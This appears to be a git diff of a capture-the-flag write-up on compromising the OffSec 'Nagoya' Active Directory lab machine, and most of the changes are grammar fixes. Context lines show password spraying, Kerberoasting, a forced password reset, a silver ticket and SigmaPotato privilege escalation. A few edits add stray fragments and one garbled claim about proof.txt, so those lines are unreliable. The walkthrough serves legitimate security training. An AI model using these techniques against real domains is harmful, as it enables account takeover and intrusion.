@@ -10,7 +10,7 @@ This write-up walks through the full attack path, starting from network enumerat
 
 ## Machine Enumeration
 
-Nmap finds 14 open ports at the initial scan. Most of the ports are Active directory generic ports such as, 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269 and 5985. The port 80 http is open.
+Nmap finds 14 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, and 5985. Port 80 (HTTP) is open.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -65,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 54.43 seconds
 ```
 
-Scan all ports using Nmap in background and added `nagoya-industries.com` into the `/etc/hosts` file.
+Scan all ports using Nmap in the background and add `nagoya-industries.com` into the `/etc/hosts` file.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -131,7 +131,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.46 seconds
 ```
 
-Port 445 SMB service enumeration using `crackmapexec` and `smbclient` but didn’t open any open shares.
+Port 445 SMB service enumeration using `crackmapexec` and `smbclient`, but it didn’t open any open shares.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -162,7 +162,7 @@ do_connect: Connection to 192.168.204.21 failed (Error NT_STATUS_RESOURCE_NAME_N
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-LDAP service enumeration using `ldapsearch` tool and found a serverice account name `nagoya$`.
+LDAP service enumeration using the `ldapsearch` tool and found a service account name `nagoya$`.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -338,7 +338,7 @@ Password:
 [-] User nagoya$ doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-Port 80 http service enumeration by visiting web application through browser and put `ffuf` tool in background for directory and page discovery.
+Port 80 HTTP service enumeration by visiting the web application through a browser and putting the `ffuf` tool in the background for directory and page discovery.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -375,7 +375,7 @@ Error                   [Status: 200, Size: 3128, Words: 652, Lines: 69, Duratio
 :: Progress: [220546/220546] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
 ```
 
-At the landing page gives team members name. Made a username list and test ran `kerbrute_linux_amd64` tool to find valid usernames.
+The landing page gives team members' names. Made a username list and test ran the `kerbrute_linux_amd64` tool to find valid usernames.
 
 - usernames.txt
     
@@ -468,7 +468,6 @@ At the landing page gives team members name. Made a username list and test ran `
     Damien.Chapman
     Joanne.Lewis
     ```
-    
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -517,11 +516,11 @@ Version: v1.0.3 (9dad6e1) - 12/03/25 - Ronnie Flathers @ropnop
 2025/12/03 12:19:12 >  Done! Tested 85 usernames (29 valid) in 0.095 seconds
 ```
 
-Once the valid usernames found then swap the files from foundusers.txt to usernames.txt.
+Once the valid usernames are found, then swap the files from foundusers.txt to usernames.txt.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image.png)
 
-Test `AS-REP` roasting using valid usernames but didn’t find any hash. 
+Test `AS-REP` roasting using valid usernames but didn’t find any hash.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -559,13 +558,13 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [-] User Joanne.Lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-The `ffuf` tool found an interesting `Error` page which reveal information about web application program language environment which is `ASP`
+The `ffuf` tool found an interesting `Error` page that reveals information about the web application programming language environment, which is `ASP`.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image1.png)
 
-Nothing leads to further. From here web application’s home page gives an idea about possible password can we guess it through company’s information.
+Nothing leads further. From here the web application’s home page gives an idea about possible passwords. We can guess it through the company’s information.
 
-Create a password list from below screenshot.
+Create a password list from the below screenshot.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image2.png)
 
@@ -585,9 +584,8 @@ Create a password list from below screenshot.
     Autumn2023
     2023Autumn
     ```
-    
 
-Brute-force username and password using `crackmapexec` against SMB service and found a valid credential `carig.carr:Spring2023`.
+Brute-forced username and password using `crackmapexec` against SMB service and found a valid credential `carig.carr:Spring2023`.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -600,7 +598,7 @@ SMB         192.168.204.21  445    NAGOYA           [-] nagoya-industries.com\na
 SMB         192.168.204.21  445    NAGOYA           [+] nagoya-industries.com\Craig.Carr:Spring2023
 ```
 
-Useing smbclient tool and `carig.carr:Spring2023` credential found an interesting application which contain password of the service account: `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`.
+Using the smbclient tool and `carig.carr:Spring2023` credentials found an interesting application that contains the password of the service account: `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
@@ -704,7 +702,7 @@ Assembly Version
 1.0.0.0
 ```
 
-Time to test new credential which gives more access to the SMB shares and tested the WinRM access using this new credential but didn’t work.
+Time to test the new credential, which gives more access to the SMB shares. I tested the WinRM access using this new credential, but it didn’t work.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya/port445smb]
@@ -727,7 +725,7 @@ HTTP        192.168.204.21  5985   NAGOYA           [*] http://192.168.204.21:59
 WINRM       192.168.204.21  5985   NAGOYA           [-] nagoya-industries.com\svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
 ```
 
-Ran the `bloodhound-python` for Active Directory enumeration. Extracted data put into the `Bloodhoud` and generate report through `Plumhound` for easy to read data.
+Ran the `bloodhound-python` for Active Directory enumeration. Extracted data is put into the `Bloodhoud` and generates a report through `Plumhound` for easy-to-read data.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -753,11 +751,11 @@ INFO: Done in 00M 02S
 INFO: Compressing output into 20251203153905_bloodhound.zip
 ```
 
-In the Plumhound’s reports.html > Kerberoastable Users gives information about the `MSSQL`.
+In the Plumhound’s reports.html > Kerberoastable Users, it gives information about the `MSSQL`.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image4.png)
 
-Try the Kerberoasting using `svc_helpdesk` credential and got a `MSSQL` user’s hash. Cracked the hash using `hashcat` tool.
+Try the Kerberoasting using the `svc_helpdesk` credential and get a `MSSQL` user’s hash. Cracked the hash using the `hashcat` tool.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -815,13 +813,13 @@ Started: Wed Dec 03 21:28:54 2025
 Stopped: Wed Dec 03 21:29:17 2025
 ```
 
-svc_mssql user is not useful even if we get and password at this moment. When I move further into the box. It might be useful later. In the `Bloodhound` tool during the enumeration, found a different attack vector. The `svc_helpdesk` user can reset a password of the `christopher.lewis` user. This user is the member to the `Remote Management Users` group which has a access of RDP service.
+The svc_mssql user is not useful even if we get the password at this moment. When I move further into the box. It might be useful later. In the `Bloodhound` tool during the enumeration, a different attack vector was found. The `svc_helpdesk`user'' can reset a password of the `christopher.lewis` user. This user is a member of the `Remote Management Users` group, which has access to the RDP service.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image5.png)
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image6.png)
 
-Reset a password given in Bloodhound tool and try to login with new changed credential to the `christopher.lewis` user. 
+Reset a password given in Bloodhound tool and try to login with new changed credential to the `christopher.lewis` user.
 
 ## Initial Foothold
 
@@ -834,7 +832,7 @@ There are two way we can change the password through `net` tool and `rpcclient` 
     └─$ net rpc password "christopher.lewis" "newP@ssword2022" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.204.21"
     ```
     
-- Intended way to reset password of the `christopher.lewis` user.
+- Intended way to reset the password of the `christopher.lewis` user.
     
     ```
     ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -893,7 +891,7 @@ ebc355b4f980c7851f9fe30fc7110624
 
 ## Privilege Escalation
 
-While enumeration localhost network found a interesting port `1433`
+While enumerating the localhost network, it found an interesting port `1433`.
 
 ```
 evil-winrm-py PS C:\> netstat -ano | findstr "1433"
@@ -901,17 +899,17 @@ evil-winrm-py PS C:\> netstat -ano | findstr "1433"
   TCP    [::]:1433              [::]:0                 LISTENING       3612
 ```
 
-In order to connect MSSQL database as a `svc_mssql` user, we need to generate silver ticket and using port forwarding to connect to the MSSQL server locally.
+In order to connect to the MSSQL database as a `svc_mssql` user, we need to generate a silver ticket and use port forwarding to connect to the MSSQL server locally. connect to the
 
 Generate silver ticket requirements.
 
-- Generate a password NT hash using `Cyberchef` tool.
+- Generate a password NT hash using the `Cyberchef` tool.
 
 ![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Nagoya/screenshots/image7.png)
 
 `E3A0168BC21CFB88B95C954A5B18F57C`
 
-- Extract the SID, SPN and Domain Name using `PowerView.ps1` script.
+- Extract the SID, SPN, and domain name using the `PowerView.ps1` script.
 
 ```
 evil-winrm-py PS C:\Users\Christopher.Lewis\Downloads> . .\PowerView.ps1
@@ -930,7 +928,7 @@ Surname               :
 UserPrincipalName     : svc_mssql@nagoya-industries.com
 ```
 
-Now we got everything for Silver ticket to generate using `impacket-ticket` module.
+Now we got everything for the Silver ticket to generate using the `impacket-ticket` module.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -951,7 +949,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator.ccache
 ```
 
-Export ticket into the kali system.
+Export the ticket into the Kali system.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -971,7 +969,7 @@ Valid starting       Expires              Service principal
 	renew until 12/02/2035 10:50:12
 ```
 
-- Intended way use this configuration into the attacking machine (Kali Linux) but without this configuration my silver ticket did work.
+- Through the intended way, use this configuration on the attacking machine (Kali Linux),configuration, but without this configuration my silver ticket did work.
     
     File location: `/etc/krb5user.conf`
     
@@ -996,7 +994,7 @@ Valid starting       Expires              Service principal
     ```
     
 
-Our silver ticket is ready to use but need to setup port forwarding tunnel using `ligolo` tool. Here is IP changed from `192.168.204.21` to `192.168.163.21` because of I reset the machine and got the new IP. So, I changed the IP in my `/etc/hosts` file as well.
+Our silver ticket is ready to use, but we need to set up a port forwarding tunnel using the `ligolo` tool. Here is the IP changed from `192.168.204.21` to `192.168.163.21` because I reset the machine and got the new IP. So, I changed the IP in my `/etc/hosts` file as well.
 
 ```
 ---Terminal 1---
@@ -1047,7 +1045,7 @@ INFO[0023] Starting tunnel to NAGOYA-IND\Christopher.Lewis@nagoya (0050569e29da)
 240.0.0.1	nagoya.nagoya-industries.com
 ```
 
-Once the port forwarding setup then try to login through `impacket-mssqlclient` tool. Tried to execute the system command through MSSQL service and it worked.
+Once the port forwarding is set up, then try to log in through the `impacket-mssqlclient` tool. Tried to execute the system command through the MSSQL service, and it worked.
 
 ```
 ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
@@ -1091,7 +1089,7 @@ PS C:\Windows\system32> whoami
 nagoya-ind\svc_mssql
 ```
 
-Checked the `whoami /priv` and found a `SeImpersonatePrivilege` permission enabled. So, tried the `SigmaPotato` attack and got an `Administrator` shell using `nc64.exe` tool.
+Checked the `whoami /priv` and found a `SeImpersonatePrivilege` permission enabled. So, I tried the `SigmaPotato` attack and got an `Administrator` shell using the `nc64.exe` tool.
 
 ```
 PS C:\Windows\system32> whoami /priv
@@ -1163,9 +1161,9 @@ type \Users\Administrator\Desktop\proof.txt
 946755fca9345fa947ba2d2f4b04f58e
 ```
 
-Without the Administrator shell the `proof.txt` flag can be extract the MSSQL service which is mentioned below.
+Without the Administrator shell, the `proof.txt` flag can be used to extract the MSSQL service, which is mentioned below.
 
-- Intended way of get a Administrator flag
+- Intended way of getting an administrator flag
     
     ```
     ┌──(kali㉿kali)-[~/offsec/Practice/Nagoya]
